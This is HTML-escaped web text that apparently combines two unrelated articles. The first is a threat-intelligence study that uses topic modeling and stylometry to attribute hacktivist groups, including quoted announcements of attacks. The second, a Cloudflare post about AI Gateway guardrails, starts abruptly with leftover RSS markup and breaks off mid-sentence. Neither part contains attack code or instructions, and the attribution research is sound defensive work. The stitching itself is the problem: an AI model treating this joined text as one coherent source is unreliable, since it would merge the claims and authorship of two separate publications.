&lt;p&gt;Topic modeling is a machine-learning technique used to identify themes (topics) within large collections of textual data. In this research, we employed&amp;nbsp;&lt;a href="https://maartengr.github.io/BERTopic/"&gt;&lt;u&gt;BERTopic&lt;/u&gt;&lt;/a&gt;, a modular and flexible framework for topic modeling. The process involved the following steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Embedding Documents&lt;/strong&gt;: The first step is to convert our textual data into numerical representations, which can be processed by machine learning algorithms. Using BERTopic, we use sentence-transformer models optimized for semantic similarity tasks. These models are adept at creating document embeddings that capture the semantic nuances of the text, making them ideal for our clustering tasks. In simpler terms, we transform the text into numbers that reflect their meanings, allowing us to find patterns and similarities.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Dimensionality Reduction&lt;/strong&gt;: High-dimensional data can be challenging for clustering algorithms, so we used&amp;nbsp;&lt;a href="https://umap-learn.readthedocs.io/en/latest/index.html"&gt;&lt;u&gt;UMAP&lt;/u&gt;&lt;/a&gt;&amp;nbsp;(Uniform Manifold Approximation and Projection) to reduce the dimensionality of the embeddings while preserving their essential structure. This step ensures that the clustering process can effectively group semantically similar messages, maintaining both local and global relationships within the data. Essentially, we simplify the data while keeping its important relationships intact, making it easier to analyze.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Clustering Documents&lt;/strong&gt;: With reduced-dimensionality embeddings, we applied&amp;nbsp;&lt;a href="https://scikit-learn.org/stable/modules/generated/sklearn.cluster.AgglomerativeClustering.html"&gt;&lt;u&gt;Agglomerative Clustering&lt;/u&gt;&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://scikit-learn.org/stable/modules/generated/sklearn.cluster.HDBSCAN.html"&gt;&lt;u&gt;HDBSCAN&lt;/u&gt;&lt;/a&gt;&amp;nbsp;(Hierarchical Density-Based Spatial Clustering of Applications with Noise) to identify clusters within the data. HDBSCAN is particularly suited to our needs because it can find clusters of varying shapes and densities while identifying outliers. This feature helps in improving the quality of the resulting topic representations by reducing noise. In other words, we group similar messages together while filtering out irrelevant ones.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Bag-of-Words Representation&lt;/strong&gt;: To create meaningful topic representations, we combined all documents within each cluster into a single document and counted the frequency of each word. This process, known as the bag-of-words representation, helps in identifying the most significant words within each cluster without making assumptions about the cluster structure. Simply put, we focus on the most common words in each group to understand what each topic is about.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Topic Representation&lt;/strong&gt;: We then used a modified version of the traditional TF-IDF (Term Frequency-Inverse Document Frequency) approach to work at the cluster level rather than the document level. This modification, called class-based TF-IDF (&lt;a href="https://towardsdatascience.com/creating-a-class-based-tf-idf-with-scikit-learn-caea7b15b858"&gt;&lt;u&gt;c-TF-IDF&lt;/u&gt;&lt;/a&gt;), calculates the importance of words within each bag of words by comparing their frequency within the cluster to their frequency across all clusters. This method allows us to extract the most representative words for each topic, providing clear and meaningful topic descriptions. In essence, we determine the key words that define each topic by comparing their importance within and across groups.&lt;/li&gt;
&lt;/ol&gt;



&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;# Docs&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Representation&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Documents&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 1&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;2775&lt;/th&gt;&lt;th&gt;attack &amp;#8211; russian &amp;#8211; cyber &amp;#8211; ukrainian &amp;#8211; hack&lt;/th&gt;&lt;th&gt;[“we announce for all&amp;nbsp;&lt;strong&gt;russian&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;hackers&lt;/strong&gt;, we begin the&amp;nbsp;&lt;strong&gt;cyber&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;attack&lt;/strong&gt;&amp;nbsp;on&amp;nbsp;&lt;strong&gt;ukrainian&lt;/strong&gt;&amp;nbsp;websites …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 2&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;1205&lt;/th&gt;&lt;th&gt;israel &amp;#8211; cyber &amp;#8211; leak &amp;#8211; zionist &amp;#8211; gaza&lt;/th&gt;&lt;th&gt;[“#&lt;strong&gt;Israel&lt;/strong&gt;Leaks &amp;#8211; Day Four &amp;#8211;&amp;nbsp;&lt;strong&gt;Leak&lt;/strong&gt;&amp;nbsp;One &amp;#8211;&amp;nbsp;&lt;strong&gt;Israel&lt;/strong&gt;&amp;nbsp;Innovation Authority &amp;#8211; #Op&lt;strong&gt;Cyber&lt;/strong&gt;Toufan #Op&lt;strong&gt;Israel&lt;/strong&gt;, …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 3&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;978&lt;/th&gt;&lt;th&gt;confidential &amp;#8211; letter &amp;#8211; leak &amp;#8211; regime &amp;#8211; iran&lt;/th&gt;&lt;th&gt;[“We&amp;nbsp;&lt;strong&gt;expose&lt;/strong&gt;&amp;nbsp;a very&amp;nbsp;&lt;strong&gt;confidential&lt;/strong&gt;&amp;nbsp;&lt;strong&gt;letter&lt;/strong&gt;&amp;nbsp;from the cultural and social vice president, …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic 4&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;490&lt;/th&gt;&lt;th&gt;cyber &amp;#8211; operation &amp;#8211; russia &amp;#8211; slava &amp;#8211; ukraine&lt;/th&gt;&lt;th&gt;[“today we will cut the tongue of&amp;nbsp;&lt;strong&gt;russian&lt;/strong&gt;&amp;nbsp;propaganda and carry out an do&amp;nbsp;&lt;strong&gt;attack&lt;/strong&gt;&amp;nbsp;on rt (tv &amp;#8220;&lt;strong&gt;russia&lt;/strong&gt;&amp;nbsp;today&amp;#8221;) …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;…&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic N&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;33&lt;/th&gt;&lt;th&gt;italy &amp;#8211; european &amp;#8211; attack &amp;#8211; farmers &amp;#8211; cyber&lt;/th&gt;&lt;th&gt;[“and we continue our joint&amp;nbsp;&lt;strong&gt;attack&lt;/strong&gt;&amp;nbsp;on&amp;nbsp;&lt;strong&gt;italy&lt;/strong&gt;&amp;nbsp;and with the help of our friends from, …”]&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Topic -1&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;283&lt;/th&gt;&lt;th&gt;&lt;strong&gt;NaN&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;[“because you are a dwarf or a small child, you certainly do not know him”, …]&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;Figure 1:&lt;/strong&gt;&amp;nbsp;Table of the topics after the Topic Representation stage&lt;/p&gt;



&lt;ol class="wp-block-list" start="6"&gt;
&lt;li&gt;&lt;strong&gt;Fine-tuning Topic Representation&lt;/strong&gt;: To further refine the topic representations, we split, merged, and dropped some topics. This step ensures that the final set of topics is both comprehensive and precise.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Assigning Topic Names Using LLMs&lt;/strong&gt;: To give the topics proper names, we used Large Language Models (LLMs), specifically&amp;nbsp;&lt;a href="https://en.wikipedia.org/wiki/Generative_pre-trained_transformer"&gt;&lt;u&gt;GPT&lt;/u&gt;&lt;/a&gt;. We provided the model with a list of keywords and representative documents for each topic and asked it to generate concise and descriptive labels for the topic. This step helps us understand what each topic is about at a glance.&lt;/li&gt;
&lt;/ol&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31054" height="452" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image1.png" width="992" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;&lt;em&gt;2&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&amp;nbsp;The topic-modeling process step by step. BERTopic is modular and flexible.&lt;/p&gt;



&lt;ol class="wp-block-list" start="8"&gt;
&lt;li&gt;&lt;strong&gt;Visualizing Topics:&lt;/strong&gt;&amp;nbsp;We visualized the distribution of topics across different hacktivist accounts and the prevalence of each topic within the accounts. This involved creating charts that show which accounts are discussing each topic and the proportion of messages each account dedicates to different topics. Visualizing topics in this manner helps us identify which groups are focused on particular themes and how their interests align or diverge. For instance, we can see if multiple groups are simultaneously discussing a significant geopolitical event. These visualizations also allow us to track changes in focus over time, providing insights into how hacktivist strategies evolve in response to global events.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;By employing topic modeling, we can inspect the topics and themes within vast amounts of textual data — the messages written by the different profiles. It allows us to gain insights into the key topics and trends discussed by these hacktivist groups, track changes in their focus areas over time, and understand their strategic objectives. For example, we can identify how the focus of certain groups shifts in response to geopolitical events, such as an uptick in messages related to cyber attacks following a major conflict. Additionally, topic modeling can reveal unexpected connections between groups discussing similar topics, suggesting potential coordination or shared motivations. Since these groups were most likely created by intelligence agencies, understanding the topics discussed by each of them can help us understand what mission or goal these accounts are serving and what purpose they were created for. Visualizing the topics over time allows us to detect shifts in focus or interest by the entities operating these accounts. Combining these insights together, we can have a better understanding of who might be behind these groups, based on the interest and the change of interest of certain groups.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="stylometry"&gt;Stylometry&lt;/h3&gt;



&lt;p&gt;Stylometry is the study of linguistic style, often used for authorship attribution. It leverages the unique way individuals write, akin to a linguistic fingerprint, to identify authors or establish connections between texts. In this research, we utilized stylometric analysis to compare the writing styles of different hacktivist groups. This method provided us with potential relationships and commonalities between these groups. The process involved the following steps:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Feature Extraction:&lt;/strong&gt;&amp;nbsp;We used the&amp;nbsp;&lt;a href="https://github.com/ZILiAT-NASK/StyloMetrix"&gt;&lt;u&gt;StyloMetrix&lt;/u&gt;&lt;/a&gt;&amp;nbsp;framework to extract nearly 200 features from the collected messages. StyloMetrix is a tool for creating text representations as vectors. Each metric in the vector quantifies a linguistic feature in the text. These features included:
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Lexical Features:&lt;/strong&gt;&amp;nbsp;These involve word choice, punctuation, vocabulary richness, and the frequency of specific words or phrases. For instance, how often certain words appear.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Syntactic Features:&lt;/strong&gt;&amp;nbsp;These include sentence structure, punctuation use, and sentence length. We looked at how often sentences start with capital letters, the average sentence length, and the use of various punctuation marks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Stylistic Elements:&lt;/strong&gt;&amp;nbsp;This covers the use of emojis, hashtags, and special characters. For example, some groups might consistently use certain emojis or have a specific way of formatting their messages.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Functional Words:&lt;/strong&gt;&amp;nbsp;These are common words like prepositions, conjunctions, and pronouns, which often unconsciously reflect the author&amp;#8217;s style.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Aggregation:&lt;/strong&gt;&amp;nbsp;The extracted features were aggregated to create a unique stylistic fingerprint for each hacktivist account. This involved summarizing the feature values across all messages from each account. By doing this, we developed a profile for each group that encapsulates their unique writing style.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Comparison:&lt;/strong&gt;&amp;nbsp;We used similarity measures to compare the stylistic fingerprints of different accounts. This analysis helped us identify accounts with similar writing styles, suggesting potential connections between them. For example, if two groups frequently use similar phrases, punctuation, or even unique emojis, it might indicate a shared author.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Visualization:&lt;/strong&gt;&amp;nbsp;The results of the stylometric analysis were visualized using network graphs. These graphs highlighted the connections between different hacktivist groups based on their writing styles, highlighting potential common authors or coordinated efforts. For instance, a dense cluster in the graph might suggest a single entity operating multiple accounts, while isolated nodes indicate independent operators.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Stylometry can reveal a wealth of information beyond mere authorship. For instance:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Attribution:&lt;/strong&gt;&amp;nbsp;By comparing the writing styles of various groups, we can attribute specific messages to known hacktivist entities or even uncover previously unknown affiliations. Often, as mentioned above, new groups are created. Stylometric analysis of the messages of the new group can help us understand whether it is a rebranding of a previously known group.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Evolution of Writing Style:&lt;/strong&gt;&amp;nbsp;Analyzing how the writing style of a single account evolves over time can provide clues about changes in the group&amp;#8217;s membership or operational strategy. It can help us observe whether a group operated by a single author, started having additional authors, and even spot if they are taking shifts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Detecting Deception:&lt;/strong&gt;&amp;nbsp;If an account suddenly changes its writing style, it might indicate that the account has been taken over by a different entity or that the original authors are trying to disguise their identity.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By identifying stylistic consistencies across different messages and accounts, we can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Link seemingly unrelated hacktivist groups:&lt;/strong&gt;&amp;nbsp;Discover connections that are not immediately apparent through traditional analysis.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enhance the accuracy of attribution:&lt;/strong&gt;&amp;nbsp;Provide additional evidence to support the identification of state-sponsored actors behind certain groups.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Uncover coordinated campaigns:&lt;/strong&gt;&amp;nbsp;Detect patterns that suggest a larger, organized effort rather than isolated incidents.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By using stylometric analysis in our methodology, we were able to gain a deeper understanding of the relationships and behaviors of hacktivist groups. This approach provided a layer of analysis that complements traditional methods, offering a more nuanced view of these groups.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="results"&gt;Results&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="topic-modeling-analysis"&gt;Topic Modeling Analysis&lt;/h3&gt;



&lt;p&gt;In our analysis, we utilized the BERTopic framework to identify and categorize the main themes discussed by various hacktivist groups. After clustering the messages, we extracted the most representative words for each cluster using the class-based TF-IDF (c-TF-IDF) method. We used GPT to assign meaningful names to these topics, which provided concise and descriptive labels based on the top keywords and representative documents for each cluster. Some initial topics were too specific or too broad, requiring refinement. For instance, smaller topics related to leaking documents from the Ukrainian Army were merged into the broader &amp;#8220;Leaking Documents from Ukrainian organizations&amp;#8221; topic, while the general topic of &amp;#8220;Cyber Attacks in Europe&amp;#8221; was split into more specific topics like &amp;#8220;Cyber Attacks Against Spain&amp;#8221; and &amp;#8220;Cyber Attacks Against UK.&amp;#8221; This iterative process ensured that the final set of topics was both comprehensive and precise. Eventually, we ended up with a set of topics that represented the main interests of these groups.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31058" height="376" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image5-1024x376.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt;:&amp;nbsp;Topic modeling visualization of users-per-topic&lt;/p&gt;



&lt;p&gt;There were multiple topics discussing cyber attacks against organizations in different countries such as Israel, Ukraine, Russia, Iran, India, Spain, the USA, and more. Others focused on cyber attacks against militant organizations such as Hezbollah in Lebanon and the Huthis in Yemen. Some topics were related to the leaking of sensitive information from countries such as Ukraine, Israel, Russia, and Iran. Many topics were directly linked to major geopolitical events, such as the Russian invasion of Ukraine and the Israel-Hamas conflict. This highlights the role of hacktivist groups in cyber warfare and propaganda. On some occasions, similar topics discussed by different groups suggest possible coordination or shared objectives.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31056" height="376" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image3-1024x376.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;&lt;em&gt;4&lt;/em&gt;&lt;/strong&gt;:&amp;nbsp;Topic modeling visualization of users-per-topic&lt;/p&gt;



&lt;p&gt;Given that these groups are likely orchestrated by intelligence agencies, analyzing the topics they discuss provides insight into the missions or goals these accounts are intended to serve. By visualizing the evolution of these topics over time, we detected changes in focus or interest by the entities managing these accounts. This combined analysis offers a clearer understanding of who might be behind these groups, based on their shifting interests and objectives. We observed how groups react to certain geopolitical events and the response time of others. For example, Russia-affiliated hacktivist groups initiated attacks in tandem with the Russian invasion of Ukraine. It took a few months for Ukrainian-related hacktivist groups to consistently retaliate with their own attacks.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31055" height="374" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image2-1024x374.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;&lt;em&gt;5&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&amp;nbsp;Topic modeling visualization of topics-per-user&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31057" height="378" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image4-1024x378.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;6&lt;/strong&gt;:&amp;nbsp;Topic modeling timeline visualization of topics and volume related to certain geopolitical events&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="stylometric-analysis"&gt;Stylometric Analysis&lt;/h3&gt;



&lt;p&gt;Stylometric analysis was used to compare the writing styles of different hacktivist groups and uncover potential connections. By extracting nearly 200 features from the collected messages, including lexical, syntactic, and stylistic elements, we created unique stylistic fingerprints for each account. This analysis not only identifies authorship but also provides deeper insights into the organizational structure and operational strategies of these groups.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31059" height="613" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image6-1024x613.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;7&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&amp;nbsp;Stylometric similarity visualization draws connections between different hacktivist groups&lt;/p&gt;



&lt;p&gt;Using similarity measures to compare these stylistic fingerprints, we identified several notable connections. Certain groups exhibited highly similar writing styles, suggesting they might be operated by the same individuals or teams. For instance, the Cyber Army of Russia Reborn, Solntsepek, and XakNet showed significant stylistic overlap. This finding supports Google Mandiant’s&amp;nbsp;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm"&gt;&lt;u&gt;reports&lt;/u&gt;&lt;/a&gt;&amp;nbsp;indicating that these groups are cyber personas used by APT44, providing further evidence of their coordinated operations. In addition, two groups not mentioned in the Mandiant report—JustEvil and NoName057—also showed some similarity to this cluster of activity. We also discovered connections between other clusters, including those targeting organizations in Israel and Albania, and another cluster focusing on Iran.&lt;/p&gt;



&lt;p&gt;Sudden changes in writing style within a single account indicated possible changes in authorship. For example, the IT Army of Ukraine showed a distinct shift in style around 2022, coinciding with a change in its messaging focus. Initially, the account featured messages in Arabic cheering for the Egyptian football team, but after the Russian invasion of Ukraine, the content shifted dramatically to focus on cyber attacks against Russia. This stark change suggests that the account was purchased, repurposed, or taken over by the group. Other examples demonstrate that more than one person is writing the messages for some groups, while other groups have only a single author who consistently writes in a similar manner.&lt;/p&gt;



&lt;h4 class="wp-block-heading" id="implications"&gt;Implications&lt;/h4&gt;



&lt;p&gt;The identification of stylistic overlaps between different groups suggests coordinated efforts and shared objectives, possibly under a single directive from intelligence agencies. This enhances our ability to attribute attacks and understand the broader strategy behind them.&lt;/p&gt;



&lt;p&gt;Moreover, detecting sudden shifts in writing style within an account can signal changes in the group&amp;#8217;s control or a strategic redirection. This information is vital for threat intelligence, as it provides early indicators of significant changes in hacktivist activities.&lt;/p&gt;



&lt;p&gt;By combining these insights with the results from topic modeling, we gain a better understanding of hacktivist groups&amp;#8217; motivations, strategies, and interconnections. This holistic view is essential for understanding and improving the attribution of operations by hacktivist groups.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="discussion"&gt;Discussion&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="interpretation-of-results"&gt;Interpretation of Results&lt;/h3&gt;



&lt;p&gt;The findings from our topic modeling and stylometric analysis provide insights into the activities and evolution of hacktivist groups. By identifying key themes discussed by these groups, we get a better understanding of their primary targets, which include various countries and organizations. The topics frequently centered around major geopolitical events, such as the Russian invasion of Ukraine and the Israel-Hamas conflict, highlighting the role of hacktivist groups in cyber warfare and propaganda. The evolution of topics over time reveals how these groups adapt their messaging in response to global events, reflecting their strategic objectives.&lt;/p&gt;



&lt;p&gt;Stylometric analysis showed the interconnectedness of hacktivist groups, with certain groups exhibiting similar writing styles indicative of common authorship or coordination. This was particularly evident in clusters of groups targeting specific regions, such as Ukraine, Israel, and Iran. Additionally, shifts in writing style within individual accounts, suggest changes in ownership of the accounts and might indicate a shift in strategic direction.&lt;/p&gt;



&lt;p&gt;Understanding the topics and writing styles of hacktivist groups improves threat intelligence by organizing the knowledge regarding their motivations and strategies. This is essential for creating effective countermeasures and accurately attributing cyber attacks to specific groups or state-sponsored entities. Continuous monitoring and analysis of hacktivist communications can provide early warnings of emerging threats, enabling proactive defense measures.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="limitations"&gt;Limitations&lt;/h3&gt;



&lt;p&gt;Despite the valuable insights gained, this research has several limitations. Data collection posed significant challenges, as hacktivist groups frequently change their accounts (the social media platforms often ban their old accounts), limiting the availability of data. Also, it is often hard to understand if an account is legit or some kind of a fan page or a copycat of a hacktivist group. Moreover, the reliance on social media messages means that the analysis may not capture the full scope of hacktivist activities, which might include messages written on their website (often on the Darkweb), forums, and sometimes directly to journalists.&lt;/p&gt;



&lt;p&gt;The machine learning models used in this study, while powerful, have inherent limitations. Topic modeling relies on the quality and comprehensiveness of the input data, and small or obscure topics may be overlooked. Stylometric analysis, though effective in identifying writing style similarities, may produce false positives if different authors share similar linguistic habits or use a language that is not properly supported by the models. Also, with enough effort, it is possible to mimic the writing style of certain groups, hence misleading the stylometric model.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="future-research-directions"&gt;Future Research Directions&lt;/h3&gt;



&lt;p&gt;To build on the research findings, future research should expand the analysis to include more hacktivist accounts. With many groups emerging rapidly, it is essential to set up automated processes for continuous monitoring and analysis. This automation would allow for real-time insights and a more comprehensive understanding of hacktivist activities.&lt;/p&gt;



&lt;p&gt;Additionally, researchers should explore other data types, such as the metadata of videos and PDFs, to gain further insights. Analyzing unique hashtags, recurring typos, and mentions across different accounts can also provide valuable information. Applying visual stylometry concepts to videos and graphic images posted by these groups can reveal additional patterns and connections.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;Our research’s significance lies in its innovative approach to analyzing hacktivist communications. By combining topic modeling and stylometric analysis, we provided a comprehensive view of these groups&amp;#8217; activities and their evolution. However, it&amp;#8217;s important to note that this approach is not infallible. The cyber threat landscape is continuously evolving, and so must our methods. We need to keep experimenting, innovating, and collaborating to stay ahead of these threats.&lt;/p&gt;



&lt;p&gt;The blurred lines between state-sponsored activities and traditional grassroots hacktivism highlight the need for adaptive and innovative threat intelligence methods. Our efforts to understand these complex dynamics are driven by the recognition that we do not have all the answers and this fact is what drove us to seek an understanding in the beginning.&lt;/p&gt;

Flag and block harmful or inappropriate content, protect personal data, and ensure compliance in real-time</description><content:encoded>&lt;p&gt;The transition of AI from experimental to production is not without its challenges. Developers face the challenge of balancing rapid innovation with the need to protect users and meet strict regulatory requirements. To address this, we are introducing &lt;b&gt;Guardrails in AI Gateway&lt;/b&gt;, designed to help you deploy AI safely and confidently. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why safety matters&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-safety-matters"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;LLMs are inherently non-deterministic, meaning outputs can be unpredictable. Additionally, you have no control over your users, and they may ask for something wildly inappropriate or attempt to elicit an inappropriate response from the AI. Now, imagine launching an AI-powered application without clear visibility into the potential for harmful or inappropriate content. Not only does this risk user safety, but it also puts your brand reputation on the line.&lt;/p&gt;&lt;p&gt;To address the unique security risks specific to AI applications, the &lt;a href="https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/"&gt;&lt;u&gt;OWASP Top 10 for Large Language Model (LLM) Applications&lt;/u&gt;&lt;/a&gt; was created. This is an industry-driven standard that identifies the most critical security vulnerabilities specifically affecting LLM-based and generative AI applications. It’s designed to educate developers, security professionals, and organizations on the unique risks of deploying and managing these systems.&lt;/p&gt;&lt;p&gt;The stakes are even higher with new regulations being introduced:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://artificialintelligenceact.eu/high-level-summary/"&gt;&lt;b&gt;&lt;u&gt;European Union Artificial Intelligence Act&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;: Enacted on August 1, 2024, the AI Act has a specific section on establishing a risk management system for AI systems, data governance, technical documentation, and record keeping of risks/abuse. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://commission.europa.eu/strategy-and-policy/priorities-2019-2024/europe-fit-digital-age/digital-services-act_en"&gt;&lt;b&gt;&lt;u&gt;European Union Digital Services Act (DSA&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt;): &lt;/b&gt;Adopted in 2022, the DSA is designed to enhance safety and accountability online, including mitigating the spread of illegal content and safeguarding minors from harmful content.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;These developments emphasize why robust safety controls must be part of every AI application.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The challenge&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-challenge"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Developers building AI applications today face a complex set of challenges, hindering their ability to create safe and reliable experiences:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Inconsistency across models: &lt;/b&gt;The rapid advancement of AI models and providers often leads to varying built-in safety features. This inconsistency arises because different AI companies have unique philosophies, risk tolerances, and regulatory requirements. Some models prioritize openness and flexibility, while others enforce stricter moderation based on ethical and legal considerations. Factors such as company policies, regional compliance laws, fine-tuning methods, and intended use cases all contribute to these differences, making it difficult for developers to deliver a uniformly safe experience across different model providers.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Lack of visibility into unsafe or inappropriate content: &lt;/b&gt;Without proper tools, developers struggle to monitor user inputs and model outputs, making it challenging to identify and manage harmful or inappropriate content effectively when trying out different models and providers.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The answer? A standardized, provider-agnostic solution that offers comprehensive observability and logs in one unified interface, along with granular control over content moderation.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;The solution: Guardrails in AI Gateway&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-solution-guardrails-in-ai-gateway"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://developers.cloudflare.com/ai-gateway/"&gt;&lt;u&gt;AI Gateway&lt;/u&gt;&lt;/a&gt; is a proxy service that sits between your AI application and its model providers (like OpenAI, Anthropic, DeepSeek, &lt;a href="https://developers.cloudflare.com/ai-gateway/providers/"&gt;&lt;u&gt;and more&lt;/u&gt;&lt;/a&gt;). To address the challenges of deploying AI safely, AI Gateway has added safety guardrails which ensure a consistent and safe experience, regardless of the model or provider you use.&lt;/p&gt;&lt;p&gt;AI Gateway gives you visibility into what users are asking, and how models are responding, through its detailed logs. This real-time observability actively monitors and assesses content, enabling proactive identification of potential issues. The Guardrails feature offers granular control over content evaluation and actions taken. Customers can define precisely which interactions to evaluate — user prompts, model responses, or both, and specify corresponding actions, including ignoring, flagging, or blocking, based on pre-defined hazard categories.&lt;/p&gt;&lt;p&gt;Integrating Guardrails is streamlined within AI Gateway, making implementation straightforward. Rather than manually calling a moderation tool, configuring flows, and managing flagging/blocking logic, you can enable Guardrails directly from your AI Gateway 